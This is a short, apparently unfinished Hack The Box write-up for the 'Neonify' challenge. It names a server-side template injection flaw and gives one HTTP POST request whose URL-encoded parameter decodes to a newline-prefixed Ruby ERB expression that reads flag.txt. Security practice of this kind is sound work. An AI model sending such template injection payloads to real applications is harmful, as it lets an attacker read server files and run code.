# Neonify - Hack The Box

## Table of Contents
- [Introduction](#introduction)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Introduction
neonfy - SSTI vuln

## Enumeration
```
POST / HTTP/1.1
......


neon=a%0a%0d%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%66%6c%61%67%2e%74%78%74%27%29%2e%72%65%61%64%20%25%3e%0a
```
